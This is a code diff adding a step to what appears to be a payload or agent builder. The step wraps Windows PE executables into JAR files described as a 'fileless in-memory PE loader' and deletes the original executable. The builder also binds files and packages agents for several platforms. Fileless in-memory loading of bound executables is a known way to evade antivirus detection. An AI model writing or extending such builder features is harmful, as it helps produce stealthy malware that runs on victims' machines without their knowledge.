@@ -953,6 +953,34 @@ func runBoundFiles() {
           }
         }
 
+        // ── JAR wrapper: fileless in-memory PE loader ────────────────────────
+        const isJarWrapper = os === "windows" && winExt === ".jar";
+        if (isJarWrapper) {
+          sendToStream({ type: "output", text: `Wrapping PE binary as fileless JAR...\n`, level: "info" });
+          try {
+            const { wrapPeAsJar } = await import("./jar-wrapper");
+            const exeBytes = fs.readFileSync(filePath);
+            const jarPath = filePath.replace(/\.[^.]+$/, ".jar");
+            await wrapPeAsJar(exeBytes, jarPath);
+            // Remove original PE only if it's a different file than the JAR output
+            if (jarPath !== filePath) fs.unlinkSync(filePath);
+            finalSize = fs.statSync(jarPath).size;
+            const jarOutputName = outputName.replace(/\.[^.]+$/, ".jar");
+            sendToStream({ type: "output", text: `JAR wrapped: ${exeBytes.length} byte PE → ${finalSize} byte JAR (fileless in-memory loader)\n`, level: "info" });
+            (build.files as any[]).push({
+              name: jarOutputName,
+              filename: jarOutputName,
+              platform,
+              version: agentVersion,
+              size: finalSize,
+            });
+            continue; // Skip the default file push below
+          } catch (jarErr: any) {
+            sendToStream({ type: "output", text: `WARNING: JAR wrapping failed: ${jarErr.message || jarErr}. Output is a raw PE binary.\n`, level: "warn" });
+          }
+        }
+        // ── End JAR wrapper ───────────────────────────────────────────────────
+
         // ── IPA packaging for iOS targets ──────────────────────────────────────
         if (os === "ios") {
           sendToStream({ type: "output", text: `Packaging ${outputName} as IPA...\n`, level: "info" });
